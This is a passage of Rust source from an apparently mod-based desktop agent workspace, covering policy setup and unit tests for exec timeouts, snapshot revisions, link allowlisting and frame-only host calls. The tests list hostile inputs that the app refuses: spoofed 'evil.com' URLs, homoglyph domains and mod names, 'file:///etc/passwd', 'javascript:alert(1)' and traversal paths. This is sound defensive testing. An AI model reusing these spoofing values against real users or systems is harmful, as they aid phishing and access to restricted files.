    install_policy();
}

/// What mods may touch, and the `h0x` module they import.
pub fn install_policy() -> async_channel::Receiver<Request> {
    gpui_shell::policy::update_default(|p| {
        p.with_capabilities(capabilities())
            .with_host_module(module(Instance { name: String::new(), props: Value::Null }, 0))
            .expect("h0x module is valid")
    });
    let (tx, rx) = async_channel::unbounded();
    let _ = REQUESTS.set(tx);
    rx
}

/// Gives the next mod copy to load a policy of its own: its `h0x` module
/// (its props, its identity) and its localStorage file. The shell hands every
/// view a copy of the default that *shares* modules and storage, so each copy
/// needs a fresh default rather than an edit of the old one.
/// Readies the next load of `inst`; returns the copy's number (for commands).
pub fn prepare_load(inst: &Instance) -> u64 {
    let copy = COPY_SEQ.with(|s| {
        s.set(s.get() + 1);
        s.get()
    });
    let dir = app_dir().join("data").join(&inst.name);
    let _ = std::fs::create_dir_all(&dir);
    let file = if inst.props.is_null() {
        "store.json".to_owned()
    } else {
        use std::hash::{Hash, Hasher};
        let mut h = std::collections::hash_map::DefaultHasher::new();
        inst.props.to_string().hash(&mut h);
        format!("store-{:016x}.json", h.finish())
    };
    let policy = gpui_shell::policy::Policy::new()
        .with_application(inst.key())
        .with_capabilities(capabilities())
        .with_storage_path(dir.join(file))
        .with_host_module(module(inst.clone(), copy))
        .expect("h0x module is valid");
    gpui_shell::policy::set_default(policy);
    copy
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(unix)]
    #[test]
    fn app_home_is_created_private_and_tightened() {
        use std::os::unix::fs::PermissionsExt;
        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
        let root = std::env::temp_dir().join(format!("h0x-ade-private-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o755)).unwrap();

        let fresh = root.join("fresh");
        make_private_dir(&fresh).unwrap();
        assert_eq!(mode(&fresh), 0o700);
        assert_eq!(mode(&root), 0o755, "parents keep their mode");
        let themes = fresh.join("themes");
        std::fs::create_dir(&themes).unwrap();
        std::fs::set_permissions(&themes, std::fs::Permissions::from_mode(0o755)).unwrap();
        make_private_dir(&fresh).unwrap();
        assert_eq!(mode(&themes), 0o755, "subdirectories keep their mode");

        let open = root.join("open");
        std::fs::create_dir(&open).unwrap();
        std::fs::set_permissions(&open, std::fs::Permissions::from_mode(0o755)).unwrap();
        make_private_dir(&open).unwrap();
        assert_eq!(mode(&open), 0o700);
        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn typings_and_agent_guide_written_to_the_app_home_never_mention_herdr() {
        let gpui_kit = gpui_shell::type_declarations(&gpui_shell::FrozenComponentRegistry::default());
        for (file, text) in [("h0x.d.ts", DECLARATIONS), ("gpui-kit.d.ts", gpui_kit.as_str()), ("AGENTS.md", AGENTS_MD)] {
            assert!(!text.trim().is_empty(), "{file} is empty");
            assert!(!text.to_ascii_lowercase().contains("herdr"), "{file} mentions herdr");
        }
    }

    #[test]
    fn exec_timeout_defaults_caps_and_rejects_invalid_values() {
        assert_eq!(exec_limit(None).unwrap(), EXEC_LIMIT);
        assert_eq!(exec_limit(Some(&HostObject::new().field("timeout", HostValue::Null).into())).unwrap(), EXEC_LIMIT);
        let options = |ms| HostObject::new().field("timeout", ms).into();
        assert_eq!(exec_limit(Some(&options(1250.0))).unwrap(), Duration::from_millis(1250));
        assert_eq!(exec_limit(Some(&options(900_000.0))).unwrap(), EXEC_MAX);
        for ms in [0.0, -1.0, f64::NAN, f64::INFINITY] {
            assert!(exec_limit(Some(&options(ms))).is_err());
        }
        assert!(exec_limit(Some(&HostObject::new().field("timeout", "30").into())).is_err());
    }

    #[test]
    fn exec_timeout_boundaries_and_non_number_values() {
        let options = |v: HostValue| HostObject::new().field("timeout", v).into();
        assert_eq!(exec_limit(Some(&options(HostValue::Number(500.0)))).unwrap(), Duration::from_millis(500));
        assert_eq!(exec_limit(Some(&options(HostValue::Number(600_000.0)))).unwrap(), EXEC_MAX);
        assert_eq!(exec_limit(Some(&options(HostValue::Number(f64::MAX)))).unwrap(), EXEC_MAX);
        assert!(exec_limit(Some(&options(HostValue::Number(f64::MIN_POSITIVE)))).unwrap() <= Duration::from_millis(1));
        for v in [
            HostValue::Number(-0.0),
            HostValue::Number(f64::NEG_INFINITY),
            HostValue::Number(-600_000.0),
            HostValue::Bool(true),
            HostValue::Str(String::new()),
            HostValue::Array(vec![HostValue::Number(1000.0)]),
            HostValue::Object(vec![("ms".into(), HostValue::Number(1000.0))]),
        ] {
            let error = exec_limit(Some(&options(v.clone()))).unwrap_err();
            assert!(format!("{error:?}").contains("timeout must be a positive number of milliseconds"), "{v:?}: {error:?}");
        }
        // Options that are not an object carry no timeout: the default applies.
        assert_eq!(exec_limit(Some(&HostValue::Number(5.0))).unwrap(), EXEC_LIMIT);
        assert_eq!(exec_limit(Some(&HostObject::new().field("cwd", "/tmp").into())).unwrap(), EXEC_LIMIT);
    }

    #[test]
    fn check_mode_shared_store_stays_in_memory() {
        std::thread::spawn(|| {
            install_check_policy();
            // Asserted before any write: a writable store here would be the person's own file.
            with_shared(|store| {
                assert!(!store.writable);
                assert!(store.values.is_empty());
                assert!(store.writer.is_none());
            });
            with_shared(|store| {
                assert!(store.set("u3-check".into(), json!(1)));
                assert!(!store.set("u3-check".into(), json!(1)));
                assert_eq!(store.values.get("u3-check"), Some(&json!(1)));
                assert!(store.writer.is_none());
            });
            finish_shared();
        })
        .join()
        .unwrap();
    }

    #[cfg(unix)]
    #[test]
    fn exec_uses_the_requested_deadline_and_reports_it() {
        let args = ["-c".into(), "sleep 0.15; printf done".into()];
        let error = run_blocking("sh", &args, None, Duration::from_millis(30)).unwrap_err();
        assert!(error.contains("0.03 s"), "{error}");
        let (code, stdout, _) = run_blocking("sh", &args, None, Duration::from_secs(2)).unwrap();
        assert_eq!((code, stdout.as_str()), (0, "done"));
    }

    #[cfg(unix)]
    #[gpui::test]
    async fn exec_returns_real_output_and_errors_under_the_test_scheduler(_cx: &mut gpui::TestAppContext) {
        let result = exec_future("sh".into(), vec!["-c".into(), "printf out; printf err >&2; exit 7".into()], None, None, EXEC_LIMIT).await.unwrap();
        assert!(matches!(result.get("code"), Some(HostValue::Number(7.0))));
        assert!(matches!(result.get("stdout"), Some(HostValue::Str(s)) if s == "out"));
        assert!(matches!(result.get("stderr"), Some(HostValue::Str(s)) if s == "err"));
        assert!(exec_future("herdr_test_missing_command_638".into(), vec![], None, None, EXEC_LIMIT).await.is_err());
        let error = exec_future("sh".into(), vec!["-c".into(), "sleep 0.15; printf late".into()], None, None, Duration::from_millis(30)).await.unwrap_err();
        assert!(error.to_string().contains("0.03 s"), "{error}");
    }

    #[test]
    fn live_reads_ignore_unread_inputs_and_keep_pending_changes() {
        let mut revisions = HashMap::new();
        let mut list = LiveReads::default();
        let mut chrome = LiveReads::default();
        list.record("agents", &revisions);
        chrome.record("layout", &revisions);
        revisions.insert("terminals", 1);
        assert!(!list.changed(&revisions));
        assert!(!chrome.changed(&revisions));
        revisions.insert("agents", 1);
        // A callback reading the new snapshot must not swallow a pending redraw.
        list.record("agents", &revisions);
        assert!(list.changed(&revisions));
        assert!(!chrome.changed(&revisions));
        assert!(!list.changed(&revisions));
        // Dependencies first read by a child or a callback remain subscribed.
        list.record("focused", &revisions);
        revisions.insert("focused", 1);
        assert!(list.changed(&revisions));
    }

    #[test]
    fn equal_snapshots_do_not_refresh_readers() {
        std::thread::spawn(|| {
            let reads = Rc::new(RefCell::new(LiveReads::default()));
            LIVE_READS.with_borrow_mut(|copies| { copies.insert(1, Rc::downgrade(&reads)); });
            read(&reads, "agents", |s| &s.agents);
            assert!(!snapshot_changed(1));
            assert!(!publish_agents(json!([])));
            assert!(!snapshot_changed(1));
            assert!(publish_terminals(json!([{"address":"t1"}])));
            assert!(!snapshot_changed(1));
            assert!(publish_agents(json!([{"address":"t1","status":"working"}])));
            assert!(snapshot_changed(1));
            assert!(!snapshot_changed(1));
            assert!(!publish_agents(json!([{"address":"t1","status":"working"}])));
            assert!(!snapshot_changed(1));
            drop(reads);
            assert!(!snapshot_changed(1));
        }).join().unwrap();
    }

    #[test]
    fn revision_moves_only_when_spaces_panes_machines_or_window_change() {
        std::thread::spawn(|| {
            let start = snapshot_revision();
            assert!(publish_spaces(json!([{"id":"s1"}])));
            let spaces = snapshot_revision();
            assert_ne!(spaces, start);
            assert!(!publish_spaces(json!([{"id":"s1"}])), "equal snapshot");
            assert_eq!(snapshot_revision(), spaces);
            assert!(publish_agents(json!([{"address":"t1"}])));
            assert!(publish_terminals(json!([{"address":"t1"}])));
            assert_eq!(snapshot_revision(), spaces, "agents and terminals are not watched");
            assert!(publish_window(json!({"active":false})));
            let inactive = snapshot_revision();
            assert_ne!(inactive, spaces);
            assert!(publish_window(json!({"active":true})));
            assert_ne!(snapshot_revision(), inactive, "switching back moves it too");
            assert!(publish_panes(json!([{"pane":"p1"}])));
            assert!(publish_machines(json!([{"name":null,"layout":"ready"}])));
            assert_eq!(snapshot_revision(), start + 5.0);
        }).join().unwrap();
    }

    #[test]
    fn revision_starts_at_zero_and_ignores_publishes_equal_to_the_empty_defaults() {
        std::thread::spawn(|| {
            assert_eq!(snapshot_revision(), 0.0);
            assert!(!publish_spaces(json!([])));
            assert!(!publish_panes(json!([])));
            assert!(!publish_machines(json!([])));
            assert!(!publish_window(Value::Null));
            assert_eq!(snapshot_revision(), 0.0);
            assert!(publish_window(json!({"active":true})));
            assert!(publish_window(Value::Null), "a window snapshot going away is a change too");
            assert_eq!(snapshot_revision(), 2.0);
        }).join().unwrap();
    }

    #[test]
    fn revision_counts_changes_in_one_tick_separately_and_a_return_to_an_earlier_snapshot() {
        std::thread::spawn(|| {
            assert!(publish_spaces(json!([{"id":"a"}])));
            let before = snapshot_revision();
            // Two snapshots in the same tick: the sum cannot cancel out, every counter only goes up.
            assert!(publish_spaces(json!([{"id":"a"},{"id":"b"}])));
            assert!(publish_panes(json!([{"pane":"p1"}])));
            assert_eq!(snapshot_revision(), before + 2.0);
            // A -> B -> A between two looks: the old stringify saw nothing, the revision still moves.
            let mid = snapshot_revision();
            assert!(publish_spaces(json!([{"id":"a"}])));
            assert!(publish_spaces(json!([{"id":"a"},{"id":"b"}])));
            assert!(snapshot_revision() > mid);
            // Only `active` was compared before; any other window field now moves it too.
            assert!(publish_window(json!({"active":true,"maximized":false})));
            let window = snapshot_revision();
            assert!(publish_window(json!({"active":true,"maximized":true})));
            assert_ne!(snapshot_revision(), window);
            // The other snapshots do not.
            let still = snapshot_revision();
            assert!(publish_tree(json!({"id":"s1","tabs":[]})));
            assert!(publish_focused(json!({"pane":"p1"})));
            assert!(publish_floats(json!({"f":{"edge":"top"}})));
            assert_eq!(snapshot_revision(), still);
        }).join().unwrap();
    }

    #[test]
    fn window_visible_reads_no_dependency_and_only_false_means_hidden() {
        std::thread::spawn(|| {
            assert!(window_visible(), "no window snapshot yet");
            let reads = Rc::new(RefCell::new(LiveReads::default()));
            LIVE_READS.with_borrow_mut(|copies| { copies.insert(1, Rc::downgrade(&reads)); });
            assert!(publish_window(json!({"active":true,"visible":true})));
            assert!(window_visible());
            // Unfocused but still on screen: visible. Minimized: not.
            assert!(publish_window(json!({"active":false,"visible":true})));
            assert!(window_visible());
            assert!(publish_window(json!({"active":false})));
            assert!(window_visible(), "a missing field counts as visible");
            assert!(publish_window(json!({"active":false,"visible":false})));
            assert!(!window_visible());
            // Asking never subscribes the copy: a focus change leaves it alone.
            assert!(!snapshot_changed(1));
            assert!(publish_window(json!({"active":true,"visible":false})));
            assert!(!snapshot_changed(1));
            // Reading window() does subscribe it.
            read(&reads, "window", |s| &s.window);
            assert!(publish_window(json!({"active":false,"visible":false})));
            assert!(snapshot_changed(1));
        }).join().unwrap();
    }

    #[test]
    fn revision_stays_exact_up_to_the_largest_safe_js_integer() {
        std::thread::spawn(|| {
            // JS numbers are f64: the sum must still move by one right below 2^53.
            REVISIONS.with_borrow_mut(|r| {
                r.insert("spaces", (1u64 << 52) - 1);
                r.insert("window", (1u64 << 52) - 2);
            });
            let before = snapshot_revision();
            assert_eq!(before, ((1u64 << 53) - 3) as f64);
            assert!(publish_window(json!({"active":false})));
            assert_eq!(snapshot_revision(), before + 1.0);
            assert!(publish_window(json!({"active":true})));
            assert_eq!(snapshot_revision(), 9_007_199_254_740_991.0, "Number.MAX_SAFE_INTEGER");
        }).join().unwrap();
    }

    #[test]
    fn loading_copies_reclaims_closed_command_channels_without_dispatch() {
        std::thread::spawn(|| {
            let inst = Instance { name: "test".into(), props: Value::Null };
            let live = module(inst.clone(), 1);
            for copy in 2..102 {
                drop(module(inst.clone(), copy));
                COMMANDS.with_borrow(|commands| assert!(commands.len() <= 2));
            }
            drop(live);
            let last = module(inst, 102);
            COMMANDS.with_borrow(|commands| assert_eq!(commands.len(), 1));
            drop(last);
        }).join().unwrap();
    }

    #[test]
    fn allowed_link_accepts_only_the_three_info_page_addresses() {
        for url in ["https://pavii.tech", "https://www.pavii.tech/products/dev-tools/docs/", "https://buckleson.com"] {
            assert!(allowed_link(url), "{url}");
        }
        for url in [
            "",
            " ",
            "http://pavii.tech",
            "http://buckleson.com",
            "http://www.pavii.tech/products/dev-tools/docs/",
            "https://pavii.tech/",
            "https://buckleson.com/",
            "https://www.pavii.tech/products/dev-tools/docs",
            "https://www.pavii.tech/products/dev-tools/docs//",
            "https://www.pavii.tech/products/dev-tools/",
            "https://www.pavii.tech",
            "https://www.buckleson.com",
            "https://pavii.tech:443",
            "HTTPS://pavii.tech",
            "https://PAVII.tech",
            "https://Buckleson.com",
            "https://www.pavii.tech/products/Dev-Tools/docs/",
            " https://pavii.tech",
            "https://pavii.tech ",
            "https://pavii.tech\n",
            "https://pavii.tech\0",
            "\thttps://buckleson.com",
            "https://pavii.tech@evil.com",
            "https://evil.com@pavii.tech",
            "https://user:pass@buckleson.com",
            "https://pavii.tech.evil.com",
            "https://buckleson.com.evil",
            "https://evilpavii.tech",
            "https://pav\u{456}i.tech",
            "https://pavii.tech?x=1",
            "https://pavii.tech#top",
            "https://buckleson.com/?",
            "https://www.pavii.tech/products/dev-tools/docs/#install",
            "https://www.pavii.tech/products/dev-tools/docs/../../../../evil",
            "//pavii.tech",
            "pavii.tech",
            "buckleson.com",
            "file:///etc/passwd",
            "file:///C:/Windows/System32/calc.exe",
            r"C:\Windows\System32\calc.exe",
            r"\\server\share\evil.html",
            "javascript:alert(1)",
            "mailto:team@pavii.tech",
            "https://github.com/vjk7989/h0x-ADE-app",
        ] {
            assert!(!allowed_link(url), "{url:?} must be refused");
        }
    }

    #[test]
    fn open_file_is_for_the_files_panel_alone() {
        std::thread::spawn(|| {
            use gpui_shell::HostArguments;
            // Even a path that does not exist: a refused caller never gets as far as looking at it.
            let missing = if cfg!(windows) { r"C:\nonexistent-h0x\video.mp4" } else { "/nonexistent-h0x/video.mp4" };
            let args = || HostArguments::new([HostValue::Str(missing.into())]);
            for name in ["", "test", "Files", "files ", "files-x", "frame-files", "frame-settings", "frame-welcome", "my-mod/files", "workspace-chrome"] {
                let host = module(Instance { name: name.into(), props: Value::Null }, 1);
                let err = host.call("openFile", &args()).expect_err(name);
                assert_eq!(err.message(), OPEN_FILE_REFUSED, "{name:?}");
            }
            let host = module(Instance { name: "files".into(), props: Value::Null }, 2);
            assert_eq!(host.call("openFile", &args()), Ok(HostValue::Str("the file is not there".into())));
            assert!(host.call("openFile", &HostArguments::default()).is_err(), "no argument");
        })
        .join()
        .unwrap();
    }

    #[test]
    fn open_file_decides_like_a_terminal_click_and_only_for_local_full_paths() {
        use crate::links::Kind;
        assert_eq!(open_plan(Kind::Text, false), OpenPlan::Text);
        assert_eq!(open_plan(Kind::System, false), OpenPlan::Open);
        assert_eq!(open_plan(Kind::Reveal, false), OpenPlan::Reveal);
        for kind in [Kind::Text, Kind::System, Kind::Reveal] {
            assert_eq!(open_plan(kind, true), OpenPlan::Reveal, "Show in folder always shows");
        }
        let full = if cfg!(windows) { r"C:\Users\me\clip.mp4" } else { "/home/me/clip.mp4" };
        assert!(local_full_path(full).is_ok());
        for bad in ["", "clip.mp4", "./clip.mp4", "a\0b", r"\\server\share\clip.mp4", "//server/share/clip.mp4"] {
            assert!(local_full_path(bad).is_err(), "{bad:?}");
        }
        assert_eq!(open_file("clip.mp4", false), "needs a full path");
        let share = if cfg!(windows) { r"\\server\share\clip.mp4" } else { "//server/share/clip.mp4" };
        assert_eq!(open_file(share, false), "network paths are not opened");
    }

    #[test]
    fn open_link_is_settings_frame_only_and_refuses_everything_else_without_opening() {
        std::thread::spawn(|| {
            use gpui_shell::HostArguments;
            // Only refused links are ever passed here, so even a broken check opens no browser.
            let refused = || HostArguments::new([HostValue::Str("https://pavii.tech/".into())]);
            for name in ["", "test", "settings", "frame-feedback", "frame-settings-x", "Frame-Settings", "frame-settings ", "my-mod/frame-settings"] {
                let host = module(Instance { name: name.into(), props: Value::Null }, 1);
                let err = host.call("openLink", &refused()).expect_err(name);
                assert_eq!(err.message(), "opening links is frame-only", "{name:?}");
                assert!(host.call("openLink", &HostArguments::default()).is_err(), "{name:?}");
            }
            let host = module(Instance { name: "frame-settings".into(), props: Value::Null }, 2);
            for url in ["", "http://pavii.tech", "https://pavii.tech/", "https://pavii.tech@evil.com", "https://buckleson.com.evil", "javascript:alert(1)", r"C:\Users\me\evil.html"] {
                let answer = host.call("openLink", &HostArguments::new([HostValue::Str(url.into())]));
                assert_eq!(answer, Ok(HostValue::Str("that link is not allowed".into())), "{url:?}");
            }
            let objects = HostValue::Object(vec![("url".into(), HostValue::Str("https://pavii.tech".into()))]);
            let arrays = HostValue::Array(vec![HostValue::Str("https://pavii.tech".into())]);
            for arg in [HostValue::Null, HostValue::Bool(true), HostValue::Number(1.0), arrays, objects] {
                assert!(host.call("openLink", &HostArguments::new([arg.clone()])).is_err(), "{arg:?} is not a string");
            }
            assert!(host.call("openLink", &HostArguments::default()).is_err(), "no argument");
        })
        .join()
        .unwrap();
    }

    #[test]
    fn account_calls_are_refused_to_every_mod_but_the_settings_and_account_frames() {
        std::thread::spawn(|| {
            use gpui_shell::HostArguments;
            const REFUSED: &str = ACCOUNT_REFUSED;
            let uid = || HostArguments::new([HostValue::Str("u1".into())]);
            for name in [
                "",
                "test",
                "settings",
                "frame-feedback",
                "frame-settings-x",
                "Frame-Settings",
                "workspace-chrome",
                "workspace-chrome-x",
                "Workspace-Chrome",
                "frame-account-x",
                "Frame-Account",
                "frame-account ",
                "my-mod/frame-account",
                "workspace-chrome ",
                "frame-workspace-chrome",
                "my-mod/workspace-chrome",
                r"my-mod\workspace-chrome",
            ] {
                let host = module(Instance { name: name.into(), props: Value::Null }, 1);
                for function in ["account", "accountCancelSignIn", "accountSwitch", "accountSignOut", "accountRemove"] {
                    let err = host.call(function, &uid()).expect_err(name);
                    assert_eq!(err.message(), REFUSED, "{name:?} {function}");
                    assert!(host.call(function, &HostArguments::default()).is_err(), "{name:?} {function}");
                }
                let started = host.begin("accountSignIn", &HostArguments::default()).err().map(|e| e.message().to_string());
                assert_eq!(started.as_deref(), Some(REFUSED), "{name:?}: no sign-in is started");
            }
        })
        .join()
        .unwrap();
    }

    #[test]
    fn installing_opencode_is_refused_to_every_mod_but_the_welcome_frame() {
        std::thread::spawn(|| {
            for name in ["", "test", "welcome", "frame-welcome-x", "Frame-Welcome", "frame-welcome ", "my-mod/frame-welcome", "frame-settings", "frame-account", "workspace-chrome"] {
                let host = module(Instance { name: name.into(), props: Value::Null }, 1);
                let err = host.call("installOpenCode", &gpui_shell::HostArguments::default()).expect_err(name);
                assert_eq!(err.message(), INSTALL_REFUSED, "{name:?}");
            }
        })
        .join()
        .unwrap();
    }

    /// Look-alike names (spacing, case, separators, invisible and homoglyph characters, paths)
    /// and arguments or props that claim the frame never unlock the install.
    #[test]
    fn installing_opencode_is_refused_to_look_alike_names_and_claimed_props() {
        std::thread::spawn(|| {
            for name in [
                " frame-welcome",
                "\tframe-welcome",
                "frame-welcome\n",
                "FRAME-WELCOME",
                "frame_welcome",
                "frame welcome",
                "framewelcome",
                "frame-welcom",
                "frame-welcome\u{200b}",
                "\u{feff}frame-welcome",
                "fr\u{430}me-welcome",
                "frame\u{2010}welcome",
                "frame-welcome\0",
                "frame/welcome",
                "frame\\welcome",
                "mods/frame-welcome",
                "../frame-welcome",
                "frame-welcome.js",
                "frame-welcome/main.js",
            ] {
                let host = module(Instance { name: name.into(), props: Value::Null }, 1);
                let err = host.call("installOpenCode", &gpui_shell::HostArguments::default()).expect_err(name);
                assert_eq!(err.message(), INSTALL_REFUSED, "{name:?}");
            }
            for props in [json!({ "name": "frame-welcome" }), json!({ "from": "frame-welcome", "frame": "welcome" }), json!({ "overlay": "frame-welcome" })] {
                let host = module(Instance { name: "my-mod".into(), props: props.clone() }, 1);
                let err = host.call("installOpenCode", &gpui_shell::HostArguments::default()).expect_err("props");
                assert_eq!(err.message(), INSTALL_REFUSED, "{props}");
            }
        })
        .join()
        .unwrap();
    }

    #[test]
    fn cancelling_a_sign_in_is_allowed_to_the_settings_and_account_frames() {
        std::thread::spawn(|| {
            // cancel_sign_in bumps a shared counter that the auth tests watch.
            let _g = crate::auth::tests::SIGN_IN_TESTS.lock().unwrap_or_else(|e| e.into_inner());
            for name in ["frame-settings", "frame-account"] {
                let host = module(Instance { name: name.into(), props: Value::Null }, 1);
                let got = host.call("accountCancelSignIn", &gpui_shell::HostArguments::default());
                assert!(matches!(got, Ok(HostValue::Null)), "{name}");
            }
        })
        .join()
        .unwrap();
    }

    #[test]
    fn pairing_and_the_web_panel_start_need_an_account_but_listing_and_stopping_do_not() {
        let a = |s: &str| s.split(' ').map(str::to_owned).collect::<Vec<_>>();
        let run = |tail: &str| a(&format!("run --bg --keep --no-parent --outlive-parent --name h0x-bridge-web --label h0x-bridge=web -- h0x-core {tail}"));
        for args in [
            a("bridge pair --transport telegram --json"),
            a("bridge web --json --lan"),
            run("bridge web --json --tunnel --yes"),
            run("bridge pair"),
        ] {
            let why = pairing_gate(&args, false).expect_err(&args.join(" "));
            assert_eq!(why.message(), "Sign in to pair a phone or Telegram.", "{args:?}");
            assert!(pairing_gate(&args, true).is_ok(), "{args:?}: signed in");
        }
        for args in [
            Vec::new(),
            a("bridge ls --json"),
            a("bridge unpair i1"),
            a("bridge lock"),
            a("bridge unlock"),
            a("bridge log"),
            a("bridge telegram token --file x"),
            a("kill h0x-bridge-web"),
            a("machine ls --json"),
            a("session ls pair web"),
            run("bridge telegram"),
            a("run --name bridge -- sh -c bridge web"),
        ] {
            assert!(pairing_gate(&args, false).is_ok(), "{args:?}");
        }
    }

    #[test]
    fn every_link_on_the_info_page_is_allowed_and_none_points_to_source_repos() {
        let page = include_str!("../defaults/frame/settings/main.js");
        let start = page.find("  info(t) {").expect("the settings frame has an Info page");
        let info = &page[start..start + page[start..].find("\n  }").unwrap()];
        let links: std::collections::BTreeSet<&str> = info.split('"').filter(|s| s.contains("://")).collect();
        let expected = std::collections::BTreeSet::from(["https://pavii.tech", "https://www.pavii.tech/products/dev-tools/docs/", "https://buckleson.com"]);
        assert_eq!(links, expected, "every allowed page is linked, and nothing else");
        assert!(links.iter().all(|l| allowed_link(l)));
        assert!(!info.to_ascii_lowercase().contains("github"), "{info}");
        assert!(info.contains("openLink("), "links open through openLink");
        assert!(!info.contains("sendFeedback"), "Send feedback is not wired to sendFeedback yet");
    }

    #[test]
    fn copy_text_is_settings_frame_only_and_refuses_more_than_4096_bytes() {
        std::thread::spawn(|| {
            use gpui_shell::HostArguments;
            let text = |s: &str| HostArguments::new([HostValue::Str(s.into())]);
            for name in ["", "test", "settings", "frame-feedback", "frame-settings-x", "Frame-Settings", "frame-settings ", "my-mod/frame-settings"] {
                let host = module(Instance { name: name.into(), props: Value::Null }, 1);
                let err = host.call("copyText", &text("/pair 123456")).expect_err(name);
                assert_eq!(err.message(), "copying is frame-only", "{name:?}");
                assert!(host.call("copyText", &HostArguments::default()).is_err(), "{name:?}");
            }
            let host = module(Instance { name: "frame-settings".into(), props: Value::Null }, 2);
            let too_long = Ok(HostValue::Str("that is too long to copy".into()));
            // No app runs here: text that passes the checks reaches the clipboard step, which has no window.
            // So an empty string is allowed (it is not refused as too long or as no text).
            let reached = Ok(HostValue::Str("no window to copy from".into()));
            for (label, s, want) in [
                ("empty", String::new(), &reached),
                ("4096 bytes", "x".repeat(4096), &reached),
                ("4097 bytes", "x".repeat(4097), &too_long),
                ("2048 two-byte characters, 4096 bytes", "\u{e9}".repeat(2048), &reached),
                ("2049 two-byte characters, 4098 bytes", "\u{e9}".repeat(2049), &too_long),
                ("1366 three-byte characters, 4098 bytes", "\u{20ac}".repeat(1366), &too_long),
                ("a windows path", r"C:\Users\Ana López\AppData\Roaming\h0x-ade\telegram-token.tmp".to_owned(), &reached),
                ("the pair command", "/pair 123456".to_owned(), &reached),
                ("a NUL and newlines", "a\0b\r\nc".to_owned(), &reached),
            ] {
                assert_eq!(&host.call("copyText", &text(&s)), want, "{label}");
            }
            let objects = HostValue::Object(vec![("text".into(), HostValue::Str("x".into()))]);
            let arrays = HostValue::Array(vec![HostValue::Str("x".into())]);
            for arg in [HostValue::Null, HostValue::Bool(true), HostValue::Number(1.0), arrays, objects] {
                assert!(host.call("copyText", &HostArguments::new([arg.clone()])).is_err(), "{arg:?} is not a string");
            }
            assert!(host.call("copyText", &HostArguments::default()).is_err(), "no argument");
        })
        .join()
        .unwrap();
    }

    #[test]
    fn the_sidebar_logo_is_an_embedded_one_path_svg_mark_and_the_frame_keeps_the_png() {
        let file = |files: &'static [(&'static str, &'static [u8])], path: &str| -> &'static [u8] {
            files.iter().find(|(p, _)| *p == path).map(|(_, b)| *b).unwrap_or_else(|| panic!("{path} is not embedded"))
        };
        let mark = file(DEFAULT_MODS, "workspace-chrome/hyperox-mark.svg");
        assert!(!mark.is_empty() && mark.len() < 8 * 1024, "a small mark: {} bytes", mark.len());
        let mark = std::str::from_utf8(mark).unwrap();
        assert!(mark.trim_start().starts_with("<svg") && mark.contains("viewBox=\""), "{mark}");
        assert_eq!(mark.matches("<path").count(), 1, "a single path: {mark}");
        assert!(mark.contains("fill=\"currentColor\""), "coloured by the text colour: {mark}");
        for other in ["<image", "<style", "<script", "href=", "data:"] {
            assert!(!mark.contains(other), "no {other} in the mark: {mark}");
        }
        assert!(DEFAULT_MODS.iter().all(|(p, _)| !p.ends_with("hyperox-white.png")), "the white PNG is gone");
        // The welcome, settings and what's-new pages keep the PNG.
        let png = file(FRAME_MODS, "welcome/hyperox.png");
        assert_eq!(&png[..8], b"\x89PNG\r\n\x1a\n", "a PNG");
        for page in ["welcome/main.js", "settings/main.js", "whatsnew/main.js"] {
            let page = std::str::from_utf8(file(FRAME_MODS, page)).unwrap();
            assert!(page.contains("image(\"frame/welcome/hyperox.png\")"), "{page}");
        }
        // The chrome mod names exactly the path the app installs it under, and no PNG logo.
        let chrome = std::str::from_utf8(file(DEFAULT_MODS, "workspace-chrome/main.js")).unwrap();
        assert!(chrome.contains("svg(\"mods/workspace-chrome/hyperox-mark.svg\")"), "{chrome}");
        assert!(!chrome.contains("hyperox.png") && !chrome.contains("hyperox-white.png"), "{chrome}");
    }

    #[test]
    fn the_telegram_token_box_saves_on_enter_and_waits_for_the_token_shape_on_a_pause() {
        // The render tests act out these handlers; this keeps them wired as acted out.
        let page = include_str!("../defaults/frame/settings/main.js");
        assert!(page.contains(r#"const TOKEN_SHAPE = /^\d+:[A-Za-z0-9_-]{20,}$/;"#), "the core's token rule");
        assert!(page.contains(r#"this.tokenInput.on("submit", (_e, cx) => { this.tokenAt = 0; this.saveToken(cx, true); });"#));
        assert!(page.contains(r#"this.tokenInput.on("change", (_e, cx) => { this.tokenAt = Date.now();"#));
        assert!(page.contains("this.tokenInput.set_masked(true);"), "the token is masked");
        assert!(page.contains("if (TOKEN_SHAPE.test(this.tokenInput.value().trim())) this.saveToken(cx);"), "the pause saves only the shape");
        assert!(!page.contains("\"st-r-token\""), "no Save button");
        assert!(page.contains("copyText(command)") && page.contains("const command = this.pairing ? `/pair ${this.pairing.code}` : \"\";"));
    }

    #[test]
    fn keyboard_focus_is_opt_in_and_commands_only_reach_the_shown_copy() {
        for metadata in [json!({}), json!({"focusable": false})] {
            assert!(!serde_json::from_value::<Hint>(metadata).unwrap().focusable);
        }
        assert!(serde_json::from_value::<Hint>(json!({"focusable": true})).unwrap().focusable);

        let (first_tx, first) = async_channel::unbounded();
        let (second_tx, second) = async_channel::unbounded();
        let (hidden_tx, hidden) = async_channel::unbounded();
        COMMANDS.with_borrow_mut(|c| *c = vec![
            (1, "same-mod".into(), first_tx),
            (2, "same-mod".into(), second_tx),
            (3, "same-mod".into(), hidden_tx),
        ]);
        set_shown_copies([1, 2].into());
        assert!(send_command_to(2, "focus"));
        assert_eq!(second.try_recv().unwrap(), "focus");
        assert!(first.is_empty());
        assert!(hidden.is_empty());
        assert!(!send_command_to(3, "focus"));
        assert!(!send_command_to(99, "focus"));
        // Existing mod key bindings still broadcast to every shown copy.
        assert!(send_command("same-mod", "existing-key"));
        assert_eq!(first.try_recv().unwrap(), "existing-key");
        assert_eq!(second.try_recv().unwrap(), "existing-key");
        assert!(hidden.is_empty());
        COMMANDS.with_borrow_mut(Vec::clear);
        set_shown_copies(Default::default());
    }

    #[cfg(unix)]
    #[test]
    fn known_agents_uses_snapshot_and_refreshes_changed_commands() {
        let snapshot = vec![json!({"key": "claude", "run": ["h0x_issue57_not_installed"]})];
        let first = std::thread::spawn(move || known_agents(None, snapshot)).join().unwrap();
        assert_eq!(first[0]["run"], json!(["h0x_issue57_not_installed"]));
        assert_eq!(first[0]["installed"], false);
